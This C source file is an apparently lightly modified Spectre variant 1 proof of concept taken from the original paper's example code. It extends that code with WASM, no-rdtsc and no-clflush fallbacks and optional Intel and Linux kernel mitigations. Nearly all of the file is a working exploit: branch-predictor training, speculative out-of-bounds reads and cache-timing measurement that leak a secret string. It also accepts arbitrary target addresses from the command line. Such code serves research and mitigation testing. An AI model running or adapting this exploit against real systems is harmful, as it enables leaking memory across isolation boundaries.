/*********************************************************************
*
* Spectre PoC
*
* This source code originates from the example code provided in the 
* "Spectre Attacks: Exploiting Speculative Execution" paper found at
* https://spectreattack.com/spectre.pdf
*
* Minor modifications have been made to fix compilation errors and
* improve documentation where possible.
*
**********************************************************************/

// #define WASM 1
// #define NORDTSC 1
// #define NOCLFLUSH 1
// #define NOMFENCE 1

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#ifdef WASM
#define NOSSE
#define NOSSE2
#define NORDTSC
#else
#ifdef _MSC_VER
#include <intrin.h> /* for rdtsc, rdtscp, clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
#endif /* ifdef _MSC_VER */
#endif /* ifdef WASM */

#ifdef NORDTSC
#include <string.h>
#include <pthread.h>
// Does this conflict with stdint?
#include <unistd.h>
#include <stdbool.h>
#define NORDTSCP
#endif

// #ifdef WASM
// #ifndef __EMSCRIPTEN_PTHREADS__
// assert("No pthreads!");
// #endif /* __EMSCRIPTEN_PTHREADS__ */
// #endif /* WASM */

/* Automatically detect if SSE2 is not available when SSE is advertized */
#ifdef _MSC_VER
/* MSC */
#if _M_IX86_FP==1
#define NOSSE2
#endif
#else
/* Not MSC */
#if defined(__SSE__) && !defined(__SSE2__)
#define NOSSE2
#endif
#endif /* ifdef _MSC_VER */

// #ifdef NOSSE
// #define NOSSE2
// #endif

#ifdef NOSSE2
#define NORDTSCP
#define NOMFENCE
#define NOCLFLUSH
#endif

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64*64];
uint8_t array1[16] = {
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
uint8_t unused2[64*64];
uint8_t array2[256 * 512];

uint8_t unused3[64*64];

char * secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

#ifdef LINUX_KERNEL_MITIGATION
/* From https://github.com/torvalds/linux/blob/cb6416592bc2a8b731dabcec0d63cda270764fc6/arch/x86/include/asm/barrier.h#L27 */
/**
 * array_index_mask_nospec() - generate a mask that is ~0UL when the
 * 	bounds check succeeds and 0 otherwise
 * @index: array element index
 * @size: number of elements in array
 *
 * Returns:
 *     0 - (index < size)
 */
static inline unsigned long array_index_mask_nospec(unsigned long index,
		unsigned long size)
{
	unsigned long mask;

	__asm__ __volatile__ ("cmp %1,%2; sbb %0,%0;"
			:"=r" (mask)
			:"g"(size),"r" (index)
			:"cc");
	return mask;
}
#endif

void victim_function(size_t x) {
  if (x < array1_size) {
#ifdef INTEL_MITIGATION
		/*
		 * According to Intel et al, the best way to mitigate this is to 
		 * add a serializing instruction after the boundary check to force
		 * the retirement of previous instructions before proceeding to 
		 * the read.
		 * See https://newsroom.intel.com/wp-content/uploads/sites/11/2018/01/Intel-Analysis-of-Speculative-Execution-Side-Channels.pdf
		 */
		_mm_lfence();
#endif
#ifdef LINUX_KERNEL_MITIGATION
    x &= array_index_mask_nospec(x, array1_size);
#endif
    temp &= array2[array1[x] * 512];
  }
}


/********************************************************************
Analysis code
********************************************************************/
#ifdef NORDTSC
void reset_counter();
int get_counter();
#endif

#ifdef NOCLFLUSH
#define CACHE_FLUSH_ITERATIONS 65536
#define CACHE_FLUSH_STRIDE 64
uint8_t cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];

/* Flush memory using long SSE instructions */
void flush_memory_sse(uint8_t * addr)
{
  float * p = (float *)addr;
  float c = 0.f;
#ifndef NOSSE
  __m128 i = _mm_setr_ps(c, c, c, c);
#endif
  int k, l;
  /* Non-sequential memory addressing by looping through k by l */
  for (k = 0; k < 4; k++)
    for (l = 0; l < 4; l++)
#ifndef NOSSE
      _mm_stream_ps(&p[(l * 4 + k) * 4], i);
#else
      p[(l * 4 + k) * 4] = c;
      p[(l * 4 + k) * 4 + 1] = c;
      p[(l * 4 + k) * 4 + 2] = c;
      p[(l * 4 + k) * 4 + 3] = c;
#endif
}
#endif

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]) {
  static int results[256];
  static int results2[256];
  int tries, i, j, k, mix_i;
  int midx;
  int midx2;
  unsigned int junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;

#ifdef NOCLFLUSH
  int junk2 = 0;
  int l;
  (void)junk2;
#endif

  for (i = 0; i < 256; i++)
  {
    results[i] = 0;
    results2[i] = 0;
  }
  for (tries = 999; tries > 0; tries--) {

#ifndef NOCLFLUSH
    /* Flush array2[512*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
#else
#ifndef NOSSE
    /* Flush array2[256*(0..255)] from cache
       using long SSE instruction several times */
    for (j = 0; j < 16; j++)
    {
      
      for (i = 0; i < 256; i++)
        flush_memory_sse( & array2[i * 512]);
    }
#else
      /* Alternative to using sse instructions to flush the CPU cache */
      /* Read addresses at 4096-byte intervals out of a large array.
         Do this around 2000 times, or more depending on CPU cache size. */

      for(l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l-= CACHE_FLUSH_STRIDE) {
        junk2 = cache_flush_array[l];
      } 
#endif /* NOSSE */
#endif

    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--) {
#ifndef NOCLFLUSH
      _mm_clflush( & array1_size);
#else
      /* Alternative to using clflush to flush the CPU cache */
      /* Read addresses at 4096-byte intervals out of a large array.
         Do this around 2000 times, or more depending on CPU cache size. */

      for(l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l-= CACHE_FLUSH_STRIDE) {
        junk2 = cache_flush_array[l];
      } 
#endif

      /* Delay (can also mfence) */
      for (volatile int z = 0; z < 100; z++) {}

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=0xFFFFFFFFFFFF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      victim_function(x);

    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = & array2[mix_i * 512];

    /*
    We need to accuratly measure the memory access to the current index of the
    array so we can determine which index was cached by the malicious mispredicted code.

    The best way to do this is to use the rdtscp instruction, which measures current
    processor ticks, and is also serialized.
    */

#ifndef NORDTSCP
      time1 = __rdtscp( & junk); /* READ TIMER */
      junk = * addr; /* MEMORY ACCESS TO TIME */
      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
#else

    /*
    The rdtscp instruction was instroduced with the x86-64 extensions.
    Many older 32-bit processors won't support this, so we need to use
    the equivalent but non-serialized tdtsc instruction instead.
    */
#ifndef NORDTSC
#ifndef NOMFENCE
      /*
      Since the rdstc instruction isn't serialized, newer processors will try to
      reorder it, ruining its value as a timing mechanism.
      To get around this, we use the mfence instruction to introduce a memory
      barrier and force serialization. mfence is used because it is portable across
      Intel and AMD.
      */

      _mm_mfence();
      time1 = __rdtsc(); /* READ TIMER */
      _mm_mfence();
      junk = * addr; /* MEMORY ACCESS TO TIME */
      _mm_mfence();
      time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      _mm_mfence();
#else
      /*
      The mfence instruction was introduced with the SSE2 instruction set, so
      we have to ifdef it out on pre-SSE2 processors.
      Luckily, these older processors don't seem to reorder the rdtsc instruction,
      so not having mfence on older processors is less of an issue.
      */

      time1 = __rdtsc(); /* READ TIMER */
      junk = * addr; /* MEMORY ACCESS TO TIME */
      time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
#endif
#else
#ifndef NOMFENCE
      int m;
      for (m=0;m<50;m++)
      {
        reset_counter();
        time1 += get_counter();
      }
      _mm_mfence();
      reset_counter();
      _mm_mfence();
      junk = * addr; /* MEMORY ACCESS TO TIME */
      _mm_mfence();
      time2 = get_counter();
      _mm_mfence();
      // printf("time2: %d\n", time2);
#else
      int m;
      for (m=0;m<50;m++)
      {
        reset_counter();
        time1 += get_counter();
      }
      reset_counter();
      junk = * addr; /* MEMORY ACCESS TO TIME */
      time2 = get_counter();
      // printf("time2: %d\n", time2);
#endif
#endif
#endif
      if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
        results[mix_i]++; /* cache hit - add +1 to score for this value */
      // if(mix_i != array1[tries % array1_size])
      //   results2[mix_i] += time2;
    }

    // midx = midx2 = -1;
    // for (i = 0; i < 256; i++) {
    //   if (midx < 0 || results2[i] <= results2[midx]) {
    //     midx2 = midx;
    //     midx = i;
    //   } else if (midx2 < 0 || results2[i] <= results2[midx2]) {
    //     midx2 = i;
    //   }
    // }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 10/0) */
  }
  // printf("mins: %d: %d; %d: %d ", midx, results2[midx], midx2, results2[midx2]);
  // for (i = 0; i < 256; i++) {printf("%d ",results2[i]);}
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
}

int g_argc              = 0;
const char * * g_argv = NULL;
#ifdef NORDTSC
int myarray[64*64] = {45};
int counter = 0;
pthread_mutex_t lock;
int go = 1;
int check = 3;

void reset_counter()
{
    pthread_mutex_lock(&lock);
    counter = 0;
    pthread_mutex_unlock(&lock);
}

int get_counter()
{
    return counter;
}

void *loop_counter()
{
    while (go)
    {
        pthread_mutex_lock(&lock);
        counter++;
        pthread_mutex_unlock(&lock);
    }
    // printf("Counter has ended: %d\n", counter);
    return NULL;
}
void *try_time();
int main(int argc,
  const char * * argv) {
  pthread_t loopc;
  pthread_t get_c;

  g_argc            = argc;
  g_argv = argv;

  int error;

  if (pthread_mutex_init(&lock, NULL) != 0)
  {
    printf("\n mutex init has failed\n");
    return 1;
  }

  error = pthread_create(&(loopc), NULL, &loop_counter, NULL);
  if (error != 0)
    printf("\nThread can't be created :[%s]", strerror(error));

  error = pthread_create(&(get_c), NULL, &try_time, NULL);
  if (error != 0)
    printf("\nThread can't be created :[%s]", strerror(error));

  pthread_join(loopc, NULL);
  pthread_join(get_c, NULL);

  pthread_mutex_destroy(&lock);
  // printf("%d\n", check);
  return (0);
}

void *try_time()
{
  // int argc = 0;
  // const char * * argv = NULL;
  
  // int g_argc              = 0;
  // const char * * g_argv = NULL;

  
  /* Delay so loop_counter thread can start */
  int z;
  for (z = 0; z < 100000; z++)
    ;

#else
/*
*  Command line arguments:
*  1: Cache hit threshold (int)
*  2: Malicious address start (size_t)
*  3: Malicious address count (int)
*/

int main(int argc,
  const char * * argv) {
  // int g_argc            = argc;
  // const char * * g_argv = argv;
    
  g_argc            = argc;
  g_argv = argv;
    
  // int g_argc              = 0;
  // const char * * g_argv = NULL;

  
#endif /* NORDTSC */
  /* Default to a cache hit threshold of 80 */
  int cache_hit_threshold = 80;

  /* Default for malicious_x is the secret string address */
  size_t malicious_x = (size_t)(secret - (char * ) array1);
  
  /* Default addresses to read is 40 (which is the length of the secret string) */
  int len = 40;
  
  int score[2];
  uint8_t value[2];
  int i;

  #ifdef NOCLFLUSH
  for (i = 0; i < (int)sizeof(cache_flush_array); i++) {
    cache_flush_array[i] = 45;
  }
  #endif
  
  for (i = 0; i < (int)sizeof(array2); i++) {
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
  }

  /* Parse the cache_hit_threshold from the first command line argument.
     (OPTIONAL) */
  if (g_argc >= 2) {
    sscanf(g_argv[1], "%d", &cache_hit_threshold);
  }

  /* Parse the malicious x address and length from the second and third
     command line argument. (OPTIONAL) */
  if (g_argc >= 4) {
    sscanf(g_argv[2], "%p", (void * * )( &malicious_x));

    /* Convert input value into a pointer */
    malicious_x -= (size_t) array1;

    sscanf(g_argv[3], "%d", &len);
  }

  /* Print git commit hash */
  #ifdef GIT_COMMIT_HASH
    printf("Version: commit " GIT_COMMIT_HASH "\n");
  #endif
  
  /* Print cache hit threshold */
  printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);
  
  /* Print build configuration */
  printf("Build: ");
  #ifndef NORDTSC
    printf("RDTSC_SUPPORTED ");
  #else
    printf("RDTSC_NOT_SUPPORTED ");
  #endif
  #ifndef NORDTSCP
    printf("RDTSCP_SUPPORTED ");
  #else
    printf("RDTSCP_NOT_SUPPORTED ");
  #endif
  #ifdef NOSSE
    printf("SSE_DISABLED ");
  #else
    printf("SSE_ENABLED ");
  #endif
  #ifndef NOMFENCE
    printf("MFENCE_SUPPORTED ");
  #else
    printf("MFENCE_NOT_SUPPORTED ");
  #endif
  #ifndef NOCLFLUSH
    printf("CLFLUSH_SUPPORTED ");
  #else
    printf("CLFLUSH_NOT_SUPPORTED ");
  #endif
  #ifdef INTEL_MITIGATION
    printf("INTEL_MITIGATION_ENABLED ");
  #else
    printf("INTEL_MITIGATION_DISABLED ");
  #endif
  #ifdef LINUX_KERNEL_MITIGATION
    printf("LINUX_KERNEL_MITIGATION_ENABLED ");
  #else
    printf("LINUX_KERNEL_MITIGATION_DISABLED ");
  #endif
  #ifdef WASM
    printf("WASM_ENABLED ");
  #else
    printf("WASM_DISABLED ");
  #endif

  printf("\n");

  printf("Reading %d bytes:\n", len);

  /* Start the read loop to read each address */
  while (--len >= 0) {
    printf("Reading at malicious_x = %p... ", (void * ) malicious_x);

    /* Call readMemoryByte with the required cache hit threshold and
       malicious x address. value and score are arrays that are
       populated with the results.
    */
    readMemoryByte(cache_hit_threshold, malicious_x++, value, score);

    /* Display the results */
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X=’%c’ score=%d ", value[0],
      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    
    if (score[1] > 0) {
      printf("(second best: 0x%02X=’%c’ score=%d)", value[1],
      (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
    }

    printf("\n");
  }
  
  #ifndef NORDTSC
  return (0);
}
  #else
  go = 0;
  return NULL;
}

#endif /* NORDTSC */
